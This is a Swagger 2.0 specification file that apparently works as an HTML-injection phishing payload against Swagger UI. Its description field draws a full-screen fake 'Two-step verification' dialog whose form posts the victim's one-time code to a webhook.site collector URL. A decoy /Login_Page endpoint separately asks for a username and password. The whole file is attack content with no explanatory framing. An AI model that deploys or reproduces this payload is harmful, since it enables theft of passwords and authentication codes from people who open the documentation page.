swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#f5f6fa;z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:400px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:40px 40px 30px;font-family:Segoe UI,Arial;"><div style="font-size:15px;font-weight:600;color:#24292f;margin-bottom:4px;">Two-step verification</div><div style="font-size:13px;color:#57606a;margin-bottom:24px;">Protecting your account. Enter the 6-digit code from your authenticator app.</div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="otp" maxlength="6" inputmode="numeric" placeholder="● ● ● ● ● ●" style="width:100%;padding:14px;font-size:22px;letter-spacing:10px;text-align:center;border:2px solid #0969da;border-radius:8px;box-sizing:border-box;margin-bottom:16px;"><button type="submit" style="width:100%;padding:12px;background:#0969da;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;">Verify</button></form><div style="font-size:12px;color:#57606a;margin-top:16px;text-align:center;">Didn''t get a code? <span style="color:#0969da;">Resend</span></div></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
